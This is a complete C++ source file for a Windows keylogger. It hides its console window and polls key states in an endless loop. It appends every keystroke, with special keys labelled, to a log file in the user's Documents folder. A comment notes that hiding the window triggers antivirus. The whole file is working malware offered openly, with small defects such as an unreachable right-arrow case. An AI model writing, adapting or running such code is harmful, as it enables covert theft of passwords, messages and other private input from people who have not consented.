#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <bits/stdc++.h>
#include<conio.h>



using namespace std;



void output(string data) {
	fstream Logs;
    Logs.open("C:\\Users\\User\\Documents\\logs.txt", fstream::app); //change the path to suit your needs
	if (Logs.is_open()) {
		Logs << data;
		Logs.close();
	}
}



bool keys(int key) {                //Just logging special keys in logs.txt so the text will be readable
	switch (key) {
	case VK_SPACE:                  //This works only in windows.
		output(" ");
		return true;
	case VK_RETURN:
		output("\n");
		return true;
    case VK_CONTROL:
		output("__CONTROL__");
		return true;
	case VK_SHIFT:
		output("__SHIFT__");
		return true;
	case VK_MENU:
		output("__ALT__");
		return true;
	case VK_BACK:
		output("\b");
		return true;
	case VK_CAPITAL:
		output("__CAPS_LCOK__");
		return true;
	case VK_TAB:
		output("#TAB");
		return true;
	case VK_UP:
		output("__UP_ARROW_KEY__");
		return true;
    case '¾':
		output(".");
		return true;
	case VK_DOWN:
		output("__DOWN_ARROW_KEY__");
		return true;
	case VK_LEFT:
		output("__LEFT_ARROW_KEY__");
		return true;
		output("__RIGHT_ARROW_KEY__");
		return true;
	default:
		return false;
	}
}


int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);  //Hide console window. Note: this function will trigger system's antivirus
	char commonKEYS = 'x';
	while (true) {
		Sleep(10);
		for (int commonKEYS = 8; commonKEYS <= 190; commonKEYS++)
		{
			if (GetAsyncKeyState(commonKEYS) == -32767) {
				if (keys(commonKEYS) == false) {

					fstream Logs;
					Logs.open("C:\\Users\\User\\Documents\\logs.txt", fstream::app);
					if (Logs.is_open()) {
                            Logs << char(commonKEYS);
                            Logs.close();
					}

				}
			}
		}
	}

	return 0;
}
